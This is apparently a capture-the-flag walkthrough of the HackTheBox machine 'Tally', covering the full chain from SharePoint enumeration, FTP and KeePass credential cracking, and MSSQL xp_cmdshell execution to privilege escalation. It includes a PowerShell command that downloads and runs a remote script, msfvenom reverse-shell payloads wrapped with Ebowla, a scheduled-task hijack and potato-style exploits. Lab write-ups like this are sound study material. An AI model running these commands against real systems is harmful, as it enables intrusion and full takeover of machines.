# Tally

Recommended this one by a colleague. Let's do it!

## Recon

```
nmap -sC -sV -O -vvv --top-ports 10000 10.10.10.59 -oA Tally
```

Quick dump:

```
$ cat Tally.gnmap | quick_check 
21/open/tcp//ftp//Microsoftftpd/
80/open/tcp//http//MicrosoftIIShttpd10.0/
81/open/tcp//http//MicrosoftHTTPAPIhttpd2.0(SSDP|UPnP)/
135/open/tcp//msrpc//MicrosoftWindowsRPC/
139/open/tcp//netbios-ssn//MicrosoftWindowsnetbios-ssn/
445/open/tcp//microsoft-ds//MicrosoftWindowsServer2008R2-2012microsoft-ds/
808/open/tcp//ccproxy-http?///
1433/open/tcp//ms-sql-s//MicrosoftSQLServer201613.00.1601.00;RTM/
5985/open/tcp//http//MicrosoftHTTPAPIhttpd2.0(SSDP|UPnP)/
47001/open/tcp//http//MicrosoftHTTPAPIhttpd2.0(SSDP|UPnP)/ 
```

Also checked the UDP ports, but got nothing interesting (or anything back)

Lots to check. We'll start with the basics, the FTP server and the Web server running on 21 and 80 respectively. 

## Info Gathering

### FTP: 21

Tried to connect using anonymous credentials, but it wasn't having it (the connection failed with the following error):

```
$ ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): anonymous
331 Password required
Password:
530 User cannot log in.
Login failed.
Remote system type is Windows_NT.
```

So that's out of the picture for the moment until we can find some valid credentials. 

### Web Server: 80

Oh boy... SharePoint... This could take a while, we'll come back to this later.

Initial `curl` request returned a 302, and suggested we go to `http://10.10.10.59/default.aspx` (took a while to come back as well, box is really struggling to run this SharePoint site it seems, though I do remember from my work placement they were spec'ing out their SharePoint servers and they were absolute monsters, and that wasn't the biggest company in the world by any means)


### Another Web Server?: 81

`curl -X GET http://10.10.10.59:81/` Seems to resolve correctly but we get a 400 Error "The request hostname is invalid"

Running `curl -v -X GET http://10.10.10.59:81/` shows that we actually gave a "Bad Request" which is odd... maybe we have to send it something else?

TRACE - Not Implemented
OPTIONS - 401 Not Authorized (What?)
DELETE - 401 (unsurprising)
PUT - Returned a 411 (The request must be chunked or have a content length, oh? Definitely something to look at again)

### MSRPC: 135

Connecting using `rpcclient` seems to work:

```
rpcclient -p 135 10.10.10.59
```

But we don't have any credentials yet, so put this in the pocket for later. 


### NetBios SSN: 139

`nbtscan` didn't seem to bring anything back. 


### SMB: 445 (Microsoft DS)

For now we're in the same boat as the other services, since it doesn't appear that this share allows for anonymous logins using a Null (x00) session. No ticket, no laundry. 


### CCProxy?: 808

OK this looks interesting, a proxy service running on a port that shares the name of that classic Roland drum machine the TR-808. I'm in. 

`nc 10.10.10.59 808` doesn't give us much at all, but it does seem to accept some input before dying.

Asking for `GET / HTTP/1.0` didn't do much, just kind of sits there accepting input for a few lines but doesn't appear to *do* anything. At least nothing we can see on our end, maybe we're crashing something or creating logs on the box, but we have no idea for now. 


### Ms-SQL: 1433

This is rather interesting, but makes sense with the presence of the SharePoint site (it's gotta store all it's crap somewhere right?). 


### SSDP: 5985 + 47001

These two ports report back as the same thing, so we'll do them at the same time to save time. 

Never really encountered this one before, luckily Google has my back:

[SSD Scanning for UpnP Vulnerabilities](https://cyberarms.wordpress.com/2013/08/23/ssdp-scanning-for-upnp-vulnerabilities/)

That leads us to an `msf` module:

```
auxiliary/scanner/upnp/ssdp_msearch
```

But it doesn't appear to do anything. That's something for the toolbox though. Although if this were OSCP we just burned our Metasploit life line on something that was pretty useless (at least at this point)

*Might be worth pulling some of these modules out of Metasploit and rewriting them in Python*

## Tackling SharePoint

This whole section is going to be given over to that webserver running port 80, and the Sharepoint site that it appears to be hosting. There has to be an exploit or hole in the implementation somewhere, we're not looking for a zero-day here, just a misconfiguration or oversight. Are there any places we can get to that we shouldn't be able to?

Before we start this we should arm ourselves with the correct tools.

[SharePoint Wordlist](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/sharepoint.txt)

(Google for SharePoint dirbuster and you'll find the now defunct dirbuster-ng project which is home to some pretty dope wordlists, so make copies!)

Since we know we're looking for stuff inside a sharepoint site it makes the most sense to use a proper list designed for such shenanigans.

Running that with `wfuzz`, and hiding the 302's (and 400's) gets us a nice list of resolved URL's.

There are a whole bunch of `_layout/` ones, but the ones that jump off the page, just because it looks like it shouldn't be something we can see, are the `_vti_bin/` URL's.

```
$ grep vti wfuzz_results 
000427:  C=200     85 L      322 W         3240 Ch        "_vti_bin/alerts.asmx"
000437:  C=200     85 L      322 W         3240 Ch        "_vti_bin/Forms.asmx"
000440:  C=200    148 L      367 W         4877 Ch        "_vti_bin/Imaging.asmx"
000433:  C=200     92 L      327 W         3418 Ch        "_vti_bin/Copy.asmx"
000434:  C=200     80 L      320 W         3146 Ch        "_vti_bin/DspSts.asmx"
000429:  C=200     85 L      322 W         3264 Ch        "_vti_bin/Authentication.asmx"
000435:  C=200    148 L      367 W         4827 Ch        "_vti_bin/DWS.asmx"
000450:  C=200    169 L      382 W         5448 Ch        "_vti_bin/SiteData.asmx"
000449:  C=200    143 L      370 W         5162 Ch        "_vti_bin/sharepointemailws.asmx"
000446:  C=200     80 L      323 W         3205 Ch        "_vti_bin/publishedlinksservice.asmx"
000448:  C=200    129 L      362 W         4450 Ch        "_vti_bin/search.asmx"
000442:  C=200    155 L      372 W         5204 Ch        "_vti_bin/Meetings.asmx"
000445:  C=200    113 L      342 W         4114 Ch        "_vti_bin/Permissions.asmx"
000441:  C=200    295 L      472 W         9066 Ch        "_vti_bin/Lists.asmx"
000459:  C=200     99 L      332 W         3640 Ch        "_vti_bin/versions.asmx"
000456:  C=200    379 L      532 W        11708 Ch        "_vti_bin/UserGroup.asmx"
000451:  C=200    148 L      367 W         4927 Ch        "_vti_bin/sites.asmx"
000455:  C=200    101 L      343 W         3714 Ch        "_vti_bin/spsearch.asmx"
000460:  C=200    127 L      352 W         4316 Ch        "_vti_bin/Views.asmx"
000072:  C=200    160 L      412 W         8722 Ch        "_layouts/FormResource.aspx"
000462:  C=200    218 L      417 W         6886 Ch        "_vti_bin/Webs.asmx"
000461:  C=200    267 L      452 W         8696 Ch        "_vti_bin/webpartpages.asmx"
000444:  C=200     92 L      327 W         3446 Ch        "_vti_bin/People.asmx"
```

(Note how `grep` just totally failed and for some reason a `_layouts/` URL got in there. What's that all about?)

OK, so these all look like interesting places that we could potentially do some interesting things in. Although a thought occurs... SharePoint 2013 (the version we're using, which we can tell by the crappy blue bar at the top) doesn't have a REST API, it uses SOAP which is ironically a pretty dirty API that uses... XML... *eww*... 

Asked around because I really didn't fancy coding a SOAP request by hand in Python, and someone pointed me in the direction of this tool:

[SharePointURLBrute v1.1.zip](https://www.bishopfox.com/download/414/)

It's pretty handy, fairly simple to use (don't mix up `-e` and `-i`)

perl ~/Tools/SharepointURLBrute/SharePointURLBrute\ v1.1.pl -a http://10.10.10.59/ -e ~/Tools/SharepointURLBrute/SharePoint-UrlExtensions-18Mar2012.txt > sharepointBrute_results

http://10.10.10.59/shared documents/forms/allitems.aspx <== of interest!

Found a docx file. Working out how to open it without installing Office (Libre or MS)

Bingo! [Online File Converter](https://www.zamzar.com/)

Wouldn't recommend it for anything important, but for something like this we don't care.

----

Got FTP Details. 

```
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

No username though...

`0#.w|tally\administrator` is the person who last modified it, but that's a janky username...

We could try `tally`, `administrator`, and `admin` see if that gets us anywhere?

----

Digging around on the Sharepoint again we come across

`http://10.10.10.59/sitepages/FinanceTeam.aspx`

This has three peoples names we can try as `username` for our FTP login.

- Rahul
- Sarah
- Tim

The wording is ambiguous, so we'll try all three users. The language would suggest that it's Sarah/Tim who will be using the FTP account, but they are asking Rahul to set it up. So we'll try all three, one is bound to work. 

Or none of them work. But then it does give the domain so we should use that somewhere... 

![picard_palm](images/picard.png)

We have one other username to try... #TeamRead

```
 Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.
 ```

 `ftp_user`

 PAY ATTENTION! READ THINGS!!

 > Also check your clipboard, the password wasn't working probably due to some errant bad character that was invisible in the terminal. Copy paste directly from the text editor or document and it works fine. Just not from terminal. 

Had a good old mooch around on the FTP once I got the password working and found a KeePass file in `Users/Tim/Files`.  

`keepass2john tim.kdbx > tim.hash`

Modify that because we're going to be using `hashcat` and not `john`. Because I have a gfx card and I intend to use it. 

`hashcat -m 13400 -a 0 -w 1 tim.hash rockyou.txt`

Should take about 20 minutes to crack that on the old 760GTX. 

Once we get something we should then figure out where to use it.

- SharePoint?
- SQL?
- SMB?

(Hashcat let me down on the first run)

After playing around for a little while it turned out that because the FTP server only supports Stream mode (Binary is ideal for this type of transfer) we got chunked data and it screwed our file up. Downloaded it again, got a totally different final block: 

First Download:
```
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da5f0f
```

Second Download:
```
tim.new:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

Note that the last block is different, that's due to the transfer screw up. *Something to be aware of!*

When we actually use the correct KeePass file, it takes `hashcat` 2 seconds to find the password. 2 seconds, not 20 minutes!

```
$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementayo
```

### The Mystery of the Random Credential

OK so we have that password `simplementayo` for the KeePass file, and the question I raised earlier becomes blindly obvious...

KeePass password goes in KeePass...

![duh](duh.png)

`apt install keepass2` and use the password we just cracked. 

```
cisco:cisco123
Finance:Acc0unting
64257-56525-54257-54734:(can't access this one?)
```

There are three accounts with passwords in the KeePass file we stole from Tim, however we can't access the third one which was under the title "SOFTWARE" and "PDFWriter". Might be something to keep in the back pocket for later (is there a way to double password a KeePass file?)

Tried the "Finance" user on SMB and it let me straight in:

```
rpc -U Finance 10.10.10.59
```

Trying to access files doesn't appear to work with the "Finance" user. 

```
help

srvinfo

netshareenum (failed)

netsharegetinfo (we don't know the share name)

getusername
Account Name: Finance, Authority Name: TALLY

rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)


```

`SeImpersonatePrivilege` sounds interesting. However we need to get into this SMB share. 

OK, so first since we have no idea of the share names we need to use something that can guess them, enter `smbmap`.

```
smbmap -u "Finance" -p "Acc0unting" -d Tally -H 10.10.10.59 > smbmap_results
```

Which gets us the following dump of the available shares:

```
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.59...
[+] IP: 10.10.10.59:445 Name: 10.10.10.59                                       
        Disk                                                    Permissions
        ----                                                    -----------
        ACCT                                                    READ ONLY
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
```

OK, so now we have some shares. Using `smbclient` to connect we're greeted with a whole bunch of stuff. Almost too much to go through. So we're going to use a lazy mans tool. `smbget`, this is just going to connect to the share and download all the files it can from what we have access to.

```
smbget -U Finance -R -e -w WORKGROUP\ACCT smb://10.10.10.59
```

Leaving that to run while pizza was consumed produced a nice collection of files and directories to go through. While things were downloading the following file popped out:

```
zz_Archived/SQL/conn-info.txt
```

That had some credentials in it for the `sa` user account on the MS-SQL connection. The `sa` account is the equivalent of `root` in an MSSQL database, although we did find this in "Archived" so it might not work, and the connection may not even allow the `sa` account to log in remotely in which case we just save it til we *finally* get a shell.

```
db: sa
pass: YE%TJC%&HYbe5Nw
```

Trying that password using a tool I found called `mssql-cli` didn't seem to work so we had another look around the share and noticed that we hadn't managed to download everything. There was a folder in `zz_Migration` called `Binaries`. In that folder was a Windows executable file called `tester.exe`, obviously we can't run it in Kali, but we can run `strings` on it.

Checking the output of `strings` we find the following little gem:

```
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
```

That looks like winner, let's give it a try.

For some reason the databsee name doesn't seem to be valid, but it works if we don't bother specifying the database so whatever. We can either use our

`SELECT name FROM master..syslogins`

```
+-----------------------------------------+
| name                                    |
|-----------------------------------------|
| sa                                      |
| ##MS_SQLResourceSigningCertificate##    |
| ##MS_SQLReplicationSigningCertificate## |
| ##MS_SQLAuthenticatorCertificate##      |
| ##MS_PolicySigningCertificate##         |
| ##MS_SmoExtendedSigningCertificate##    |
| ##MS_PolicyEventProcessingLogin##       |
| ##MS_PolicyTsqlExecutionLogin##         |
| ##MS_AgentSigningCertificate##          |
| WIN-A1D9PN09GFO\Sarah                   |
| NT SERVICE\SQLWriter                    |
| NT SERVICE\Winmgmt                      |
| NT SERVICE\MSSQLSERVER                  |
| NT AUTHORITY\SYSTEM                     |
| NT SERVICE\SQLSERVERAGENT               |
| NT SERVICE\SQLTELEMETRY                 |
+-----------------------------------------+
```

OK, so we're probably `Sarah`, let's run a `whoami` and find out for sure.

`EXEC xp_cmdshell 'whoami';`

And we get an error. But fear not for there is a way around this: 

```
– To allow advanced options to be changed.
EXEC sp_configure ‘show advanced options’, 1
 — To update the currently configured value for advanced options.
RECONFIGURE
 — To enable the feature.
EXEC sp_configure ‘xp_cmdshell’, 1
 — To update the currently configured value for this feature.
RECONFIGURE
```

Now we can run our `xp_cmdshell` and *FINNALY!* get our shell.

> Edit: It seems like there is something running on the box that resets the changes we make to the database... that isn't going to get annoying.


## Exploitation

OK, so we finally have our way in. 

Now we have to get our Powershell on and get a Reverse Shell on the box so we can actually get something done here. 

First thing we'll try is `Empire`, it should give us a nice persistent shell.

Took some messing around with the quotes and we also found that the `-cmd` command doesn't parse using `xp_cmdshell`, but eventually we got an interactive agent back in `Empire`

```
EXEC xp_cmdshell "powershell.exe -NoP -NonI -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/sh.ps1')";
```

Now we can just run commands on the system. 

```
(Empire: KF4YUGAC) > sysinfo
[*] Tasked KF4YUGAC to run TASK_SYSINFO
[*] Agent KF4YUGAC tasked with task ID 2
(Empire: KF4YUGAC) > sysinfo: 0|http://10.10.14.3:443|TALLY|Sarah|TALLY|10.10.10.59|Microsoft Windows Server 2016 Standard|False|powershell|7532|powershell|5                   
[*] Agent KF4YUGAC returned results.
Listener:         http://10.10.14.3:443
Internal IP:    10.10.10.59
Username:         TALLY\Sarah
Hostname:       TALLY
OS:               Microsoft Windows Server 2016 Standard
High Integrity:   0
Process Name:     powershell
Process ID:       7532
Language:         powershell
Language Version: 5
```

So we can confirm two things here, we are the User `Sarah` which we already knew from the previous `whoami` command, and that the box is running Windows Server 2016 Standard as its operating system. Awesome.

## Priv Esc

Took a few minutes to come back, but when we first got onto the box we ran the `allchecks` module from `PowerUp` (using our Empire agent), and we got the following results:

```
[*] Running Invoke-AllChecks                                                                                                                                             [56/465]


[*] Checking if user is in a local group with administrative privileges...

                                                      
[*] Checking for unquoted service paths...

                                                     
ServiceName    : c2wts
Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'c2wts' -Path <HijackPath>
CanRestart     : False 
                       
ServiceName    : c2wts 
Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'c2wts' -Path <HijackPath>
CanRestart     : False





[*] Checking service executable and argument permissions...


[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
IdentityReference : TALLY\Sarah
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'




[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


DefaultDomainName    : 
DefaultUserName      : sarah
DefaultPassword      : mylongandstrongp4ssword!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 



[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....





Invoke-AllChecks completed!

[*] Valid results returned by 10.10.10.59

```

OK, so we have a bunch of cool things to check here. 

- AutoLogon Credentials for `sarah`
- Two(?) "Unquoted Service Paths"
- One Potentially hijackable DLL 

AutoLogon will be cool if this shell doesn't persist, but it's looking good so far, ultimately we're already the `sarah` user so it'd just be *another* way to log in, we do have her plaintext credentials now though, so that's a winner.

One problem we are having however is that `Empire` doesn't really have an interactive shell in the proper sense of the term, it runs the specified commands via the agent then reports back via the listener which runs a http server. 

So we need to use Nishang to get a shell instead. 

Copy the shell into a `www` folder then add the example command to the bottom so it auto-executes. 

### Grab the Flag! 

Now that we have a proper shell on the box, we can look around for the flags, which are probably in the users home folders. And sure enough on Sarah's Desktop is a `user.txt` file. Which we'll grab and store away for safe keeping., 

`user:be72362e8dffeca2b42406d5d1c74bb1`

### Mooching Around the System

Our new shell is awesome so let's take advantage of it. 

We have some options now


### Playing Around With Unqouted Service Paths

The crux of this vulnerability is the lack of quotation marks. 

Looking at the output of the Invoke-AllChecks command we ran earlier, we can confirm two things:

```
ServiceName    : c2wts
Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
```

There is an unquoted Path, and that executable runs as the `LocalSystem` user, which is great. 

The problem we'll run into here is that in this context we can't restart the box, which is required to reload the service path. So this is a dead end, but something to keep in mind for the future.

### HiJacking a DLL

Next on the list of things to check is the potentially HiJackable DLL that was found. 

```
[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
IdentityReference : TALLY\Sarah
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
```

### Using What We've Found

On Sarahs Desktop were two files, a PowerShell script and an XML file. 

The XML file contained all of the configuration settings for a task that was scheduled to run once an hour as the Admin user. The task that ran was to execute the PowerShell script also on the Desktop, so we just changed the content to a reverse shell.

Missed it the first time because I forgot to hit enter on the `nc` catcher. Got it nice and clean second time, straight into the Administrators Desktop, and found the `root.txt`.

`root:608bb707348105911c8991108e523eda`

### MORE ROOT SHELLS!

OK so there are a few ways to get a root shell on this machine, and we're going to go through them now, just for poops and giggles. 

__ROOT SHELL #2__

*Potatoes laced with Ebola*

Got this one from an ippsec Video, so shoutouts. This is a nice little technique. 

The first priv-esc shell we're going to use is a variant of RottenPotato called lonelypotato, and it was created by one of the HackTheBox guys.

To perform this attack we'll need two things:

- [LonelyPotato](https://github.com/decoder-it/lonelypotato)
- [Ebowla](https://github.com/Genetic-Malware/Ebowla)

What is going to happen is as follows:

- We'll upload both files to the target machine (doesn't matter how really)
- We'll then use the lonelypotato executable to fire another shell which we'll encode with Ebowla 

First we created a basic MSFVenom payload with a reverse shell we could catch using `nc` (becausee we're still not using MetaSploit) 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=9003 -f exe -a x64 -o 9003.exe`

Then we use Ebowla to turn it into a GO binary by messing with some of the config options in `genetic.config` in the Ebowla directory. 

After we've changed the options we want (in our case we changed the payload to GO, the output to EXE, removed most of the system variables except added the HOSTNAME as TALLY) we simply give the following command:

```
python ebowla.py 9003 genetic.config
```

And that'll output to the `output` folder.

At this point I ran into an issue because I didn't have the correct MinGW compiler:

`apt install mingw-w64 mingw-w64-x86-64-dev` 

That sorted it right out.

Then just issue the build order:

`/build_x64_go.sh output/go_symmetric_9003.exe.go ebowla.exe`

Copy those two executables somewhere sensible then to execute on the target machine just do the following (make sure you have a listener open to catch the shell)


```
.\lonleypotato.exe * ebowla.exe
```

Mine took a moment to come back, but it happily caught a Root shell. So that's number two. What about number 3?

__ROOT SHELL 3__

*CVE-2017-0213*

Yay public exploits! 

we're pretty sure this is the on we're looking for, but just to be sure, we'll run RastaMouses Sherlock PowerShell script. 

```
PS C:\Windows\system32> IEX(IWR('http://10.10.14.3:8000/Sherlock.ps1'))
PS C:\Windows\system32> Find-AllVulns
```

That didn't return any results, but not to worry we can still track down Vulns using the `systeminfo` command and checking out the installed HotFixes:

```
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4015217
```

Cool, so if we take that last KB value, and Google it we'll get the date that HotFix was released on, which in this case is April 11 2017. Now we can check against known vulnerabilities and the dates that they were released on, and if the latter is later than the former, then we're in business. 


```
CVE-2017-0213 | Windows COM Elevation of Privilege Vulnerability
Security Vulnerability

Published: 05/09/2017 | Last Updated : 09/12/2017
MITRE CVE-2017-0213 
```

Sweet, we're on. Now we just have to figure out how to work it and we can have another Root shell on this box.


__ROOT SHELL 4?!?!__ 

OK so it turns out there is a 4th way to exploit this box, using Firefox of all things. 

`searchsploit firefox`

```
Mozilla Firefox < 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET 5.52 Bypass)   | exploits/windows/remote/42484.html
```

There was a note on the Sharepoint site that tells us where we need to put this file: 

## Summary

Well that was a journey wasn't it. 

Let's do a quick TL;DR

- Scanned the box, found a bunch of open ports
- Checked the open ports, found a Sharepoint site
- Bruteforced the sharepoint directories
- Found a file with ftp credentials and another page with the user name
- Used this to access an FTP share
- Found a KeePass file
- Cracked it with Hashcat
- Used that to access the MSSQL server
- From the MSSQL server we get code execution via `xp_cmdshell` 
- Dropped an `Empire` agent, ran `Invoke-AllChecks` from PowerUp
- Found some interesting files (for other priv esc steps)
- Closed out of the `Empire` agent, and dropped a Nishang reverse shell
- Caught that using `nc` 
- Navigated to user desktop 
- Found a file that ran once an hour as tally/administrator
- Overwrote file with Reverse Shell
- Caught that on another port using `nc`
- ???
- Profit + flags

Then we went and got some extra root shells, just to learn the methods. Both from the point of the MSSQL code execution:

